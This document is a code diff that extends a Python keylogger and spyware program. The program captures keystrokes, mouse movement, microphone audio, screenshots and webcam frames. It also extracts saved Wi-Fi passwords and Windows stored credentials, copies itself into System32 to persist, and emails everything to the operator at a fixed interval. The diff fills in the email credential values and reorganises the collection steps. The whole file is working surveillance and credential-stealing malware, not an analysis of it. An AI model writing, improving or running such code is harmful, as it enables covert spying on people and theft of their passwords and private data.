@@ -1,4 +1,4 @@
-try:    
+try:
     import os
     import cv2
     import wmi
@@ -20,6 +20,7 @@ try:
     import soundfile as sf
     import sounddevice as sd
     from pynput import keyboard
+    from pydub import AudioSegment
     from pynput.mouse import Listener as MouseListener
     from email.mime.multipart import MIMEMultipart
     from email.mime.base import MIMEBase
@@ -50,50 +51,53 @@ finally:
 
     atexit.register(cleanup_temp_dir)
 
-    EMAIL_ADDRESS = "YOUR_EMAIL_ADDRESS"
-    EMAIL_PASSWORD = "YOUR_PASSWORD"
-    IP_INFO_TOKEN = "YOUR_IP_INFO_TOKEN"
+    EMAIL_ADDRESS = "408f2b5a1bfe28"
+    EMAIL_PASSWORD = "1b83545fd014d7"
+    IP_INFO_TOKEN = "69a853b9501ab9"
     SEND_REPORT_EVERY = 10
 
     class KeyLogger:
         def __init__(self, time_interval, email, password):
             self.interval = time_interval
-            self.log = "KeyLogger Started...\n"
+            self.log = "KeyLogger Has Started...\nHere is some information about the target system:\n\n"
             self.email = email
             self.password = password
 
         def appendlog(self, string):
             self.log = self.log + string
 
-        def on_move(self, x, y):
+        def onMove(self, x, y):
             current_move = f"Mouse moved to {x} {y}\n"
             self.appendlog(current_move)
 
-        def on_click(self, x, y, button, pressed):
+        def onClick(self, x, y, button, pressed):
             action = "Pressed" if pressed else "Released"
             button_name = str(button).split('.')[-1]
             current_click = f"Mouse {action} at {x} {y} ({button_name})\n"
             self.appendlog(current_click)
 
-        def on_scroll(self, x, y, dx, dy):
+        def onScroll(self, x, y, dx, dy):
             current_scroll = f"Mouse scrolled at {x} {y} ({dx}, {dy})\n"
             self.appendlog(current_scroll)
 
+        def onPress(self, key):
+            numeric_numpad_keycodes = {96, 97, 98, 99, 100, 101, 102, 103, 104, 105}
 
-        def save_data(self, key):
-            try:
-                current_key = str(key.char)
-                if current_key == ' ':
-                    current_key = " "
-            except AttributeError:
-                if key == key.space:
-                    current_key = " "
-                elif key == key.esc:
-                    current_key = "ESC"
-                else:
-                    current_key = " " + str(key) + " "
-            
-            self.appendlog(current_key)
+            if hasattr(key, 'vk') and key.vk in numeric_numpad_keycodes:
+                self.appendlog(str(key.vk - 96))
+            else:
+                try:
+                    current_key = str(key.char)
+                    if current_key == ' ':
+                        current_key = ' '
+                    self.appendlog(current_key)
+                except AttributeError:
+                    if key == keyboard.Key.space:
+                        self.appendlog(' ')
+                    elif key == keyboard.Key.esc:
+                        self.appendlog("ESC")
+                    else:
+                        self.appendlog(str(key))
 
         def send_mail(self, message_subject, message_body, attachment_paths=None):
             sender = self.email
@@ -121,21 +125,36 @@ finally:
                 server.sendmail(sender, receiver, msg.as_string())
 
         def microphone(self):
-            fs = 44100
+            fs = 44100 # Represents the sampling frequency (in Hz) for the audio recording.
             seconds = SEND_REPORT_EVERY
+            try:
+                recording = sd.rec(int(seconds * fs), samplerate = fs, channels = 2)
+                sd.wait()
 
-            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
-            sd.wait()
+                audio_path = os.path.join(temp_dir, "audio.wav")
+                sf.write(audio_path, recording, fs)
 
-            audio_path = os.path.join(temp_dir, "audio.wav")
-            sf.write(audio_path, recording, fs)
+                try:
+                    AudioSegment.from_wav(audio_path)
+                    self.appendlog("Audio recorded successfully.\n\n")
+
+                except Exception as play_error:
+                    self.appendlog(f"An error occurred while trying to play the recorded audio: {str(play_error)}\n\n")
+
+            except Exception as e:
+                self.appendlog(f"An error occurred while recording audio: {str(e)}\n\n")
 
         def screenshot(self):
-            img = pyscreenshot.grab()
-
-            img_path = os.path.join(temp_dir, "screenshot.png")
-            img.save(img_path)
-
+            try:
+                img = pyscreenshot.grab()
+                img_path = os.path.join(temp_dir, "screenshot.png")
+                img.save(img_path)
+                if os.path.isfile(img_path):
+                    self.appendlog("Screenshot saved successfully.\n")
+                else:
+                    self.appendlog("Screenshot was not saved successfully.\n")
+            except Exception as e:
+                self.appendlog(f"An error occurred while taking a screenshot: {str(e)}\n")
 
         def get_wifi_passwords(self):
             wifi_passwords = []
@@ -143,7 +162,7 @@ finally:
             try:
                 profiles = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode("utf-8", errors = "replace")
                 profile_names = [line.split(":")[1].strip() for line in profiles.splitlines() if "All User Profile" in line]
-                
+
                 for name in profile_names:
                     try:
                         wifi_info = subprocess.check_output(["netsh", "wlan", "show", "profile", "name=" + name, "key=clear"]).decode("utf-8", errors = "replace")
@@ -161,8 +180,8 @@ finally:
             try:
                 ip_config_output_bytes = subprocess.check_output(["ipconfig", "/all"])
                 ip_config_output = ip_config_output_bytes.decode("utf-8", errors = "replace")
-                return ip_config_output
-            
+                self.appendlog(ip_config_output)
+
             except subprocess.CalledProcessError:
                 return "Error retrieving IP configuration."
 
@@ -201,11 +220,8 @@ finally:
             machine = platform.machine()
             user = getpass.getuser()
 
-            ip_config = self.get_ip_config()
-            
             system_info = f"Hostname: {hostname}\nIP: {ip}\nProcessor: {plat}\nSystem: {system}\nMachine: {machine}\nUser: {user}\n"
-            system_info += f"{ip_config}\n"
-            
+
             self.appendlog(system_info)
 
         def formatted_data(self, data, indent = 0):
@@ -234,11 +250,11 @@ finally:
             ]
 
             ordered_data = {key: data[key] for key in ordered_keys if key in data}
-            
+
             formatted_info = self.formatted_data(ordered_data)
             self.appendlog("Internet Protocol Info:")
             self.appendlog(formatted_info)
-            
+
         def get_credentials(self):
             credentials = []
 
@@ -249,7 +265,7 @@ finally:
                     username = cred['UserName']
                     target_name = cred['TargetName']
                     credential_blob = cred['CredentialBlob']
-                    
+
                     if credential_blob:
                         password = self.get_password_from_blob(credential_blob)
                     else:
@@ -265,14 +281,13 @@ finally:
                 password = credential_blob.decode('latin-1')
                 return password
             except Exception:
-                return "Error decoding password"        
-            
+                return "Error decoding password"
+
         def get_and_send_credentials(self):
             try:
                 credentials = self.get_credentials()
 
                 if credentials:
-                    self.appendlog('Credentials saved to txt file.\n\n')
                     credentials_text = ""
                     for idx, (username, target_name, password) in enumerate(credentials, start = 1):
                         credentials_text += f"Credentials {idx}:\n"
@@ -284,11 +299,16 @@ finally:
                     with open(credentials_path, "w") as f:
                         f.write(credentials_text)
 
+                        with open(credentials_path, "r") as file:
+                            content = file.read()
+                            if content:
+                                self.appendlog('Credentials saved to txt file.\n')
+
                 else:
-                    self.appendlog("No credentials found.\n\n")
+                    self.appendlog("No credentials found.\n")
             except Exception as e:
-                self.appendlog("An error occurred while getting credentials: {}\n\n".format(e))
-            
+                self.appendlog("An error occurred while getting credentials: {}\n".format(e))
+
         def get_local_users_info(self):
             pythoncom.CoInitialize()
             c = wmi.WMI()
@@ -337,7 +357,7 @@ finally:
             self.appendlog(user_info_str)
 
         def get_and_send_local_users_info(self):
-            
+
             local_users_info = self.get_local_users_info()
 
             c = wmi.WMI()
@@ -357,18 +377,24 @@ finally:
             try:
                 source_path = os.path.abspath(__file__)
                 destination_path = r"C:\Windows\System32"
-                
-                target_file_path = os.path.join(destination_path, os.path.basename(source_path))
-                            
-                if not os.path.exists(target_file_path):
-                    shutil.copy(source_path, destination_path)
-                    self.appendlog(f"File successfully copied to {destination_path} directory.\n\n")
 
+                target_file_path = os.path.join(destination_path, os.path.basename(source_path))
+
+                if os.path.exists(target_file_path):
+                    with open(target_file_path, 'rb') as target_file, open(source_path, 'rb') as source_file:
+                        if target_file.read() != source_file.read():
+                            with open(target_file_path, 'wb') as target_file:
+                                with open(source_path, 'rb') as source_file:
+                                    target_file.write(source_file.read())
+                            self.appendlog(f"File content updated in {destination_path} directory.\n")
+                        else:
+                            self.appendlog(f"File already exists with the same content in {destination_path} directory.\n")
                 else:
-                    self.appendlog(f"File already exists in {destination_path} directory.\n\n")
-                            
+                    shutil.copy(source_path, destination_path)
+                    self.appendlog(f"File successfully copied to {destination_path} directory.\n")
+
             except PermissionError:
-                self.appendlog(f"Access denied while copying file to {destination_path}.\n\n")
+                self.appendlog(f"Access denied while copying file to {destination_path}.\n")
 
             except Exception as e:
                 self.appendlog("An error occurred:", e)
@@ -384,25 +410,30 @@ finally:
             credentials_thread = threading.Thread(target = self.get_and_send_credentials)
 
             local_users_thread = threading.Thread(target = self.get_and_send_local_users_info)
-            local_users_thread.start()
 
-            mouse_listener = MouseListener(on_move = self.on_move, on_click = self.on_click, on_scroll = self.on_scroll)
-            keyboard_listener = keyboard.Listener(on_press = self.save_data)
-
-            self.system_information()
-            self.get_systeminfo()
-            self.take_photo()
-            credentials_thread.start()
-            self.copy_to_system32()
-            self.get_own_ip_info(IP_INFO_TOKEN)
+            mouse_listener = MouseListener(on_move = self.onMove, on_click = self.onClick, on_scroll = self.onScroll)
+            keyboard_listener = keyboard.Listener(on_press = self.onPress)
 
             wifi_passwords = self.get_wifi_passwords()
             wifi_info_string = "\n".join([f"WiFi Name: {item['WiFi Name']}, Password: {item['Password']}" for item in wifi_passwords])
 
-            self.appendlog("\n\nWiFi Information On The Target System:\n\n")
+            self.system_information()
+            self.appendlog('\n')
+            self.copy_to_system32()
+            credentials_thread.start()
+            self.take_photo()
+            self.appendlog("WiFi Information On The Target System:\n\n")
             self.appendlog(wifi_info_string)
+            self.appendlog('\n')
+            self.get_ip_config()
+            self.appendlog('\n')
+            self.get_own_ip_info(IP_INFO_TOKEN)
+            self.appendlog('\n')
+            self.get_systeminfo()
+            local_users_thread.start()
+
             self.appendlog('\n\n')
-            
+
             with keyboard_listener, mouse_listener:
                 microphone_thread.start()
                 screenshot_thread.start()
@@ -425,9 +456,9 @@ finally:
             while True:
                 microphone_thread = threading.Thread(target = self.microphone)
                 screenshot_thread = threading.Thread(target = self.screenshot)
-                
-                mouse_listener = MouseListener(on_move = self.on_move, on_click = self.on_click, on_scroll = self.on_scroll)
-                keyboard_listener = keyboard.Listener(on_press = self.save_data)
+
+                mouse_listener = MouseListener(on_move = self.onMove, on_click = self.onClick, on_scroll = self.onScroll)
+                keyboard_listener = keyboard.Listener(on_press = self.onPress)
 
                 self.take_photo()
 
@@ -444,7 +475,7 @@ finally:
                         os.path.join(temp_dir, "captured_frame.jpg"),
                     ]
                     self.send_mail("Keylogger Report", self.log, attachment_paths)
-                    
+
                     time.sleep(SEND_REPORT_EVERY)
 
     if __name__ == "__main__":
